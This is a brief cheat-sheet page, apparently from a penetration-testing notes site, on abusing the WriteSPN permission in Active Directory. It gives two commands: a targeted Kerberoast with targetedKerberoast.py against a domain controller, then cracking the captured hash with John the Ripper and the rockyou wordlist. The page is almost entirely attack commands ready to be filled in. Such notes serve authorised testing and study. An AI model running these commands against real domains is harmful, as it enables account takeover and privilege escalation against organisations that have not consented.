---
title: "WriteSPN"
date: 2025-7-14
tags: ["WriteSPN", "Targeted Kerberoast", "Domain Controller", "Active Directory", "Windows"]
---

### Privesc #1: Targeted Kerberoast

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Targeted Kerberoast

```console
# Password
python3 targetedKerberoast.py -d '<DOMAIN>' -u '<USER>' -p '<PASSWORD>' --dc-ip '<DC_IP>'
```

#### 2. Hash Crack

```console
john --wordlist=/usr/share/wordlists/rockyou.txt <HASH_FILE>
```

<small>*Ref: [targetedKerberoast](https://github.com/ShutdownRepo/targetedKerberoast)*</small>

{{< /tabcontent >}}
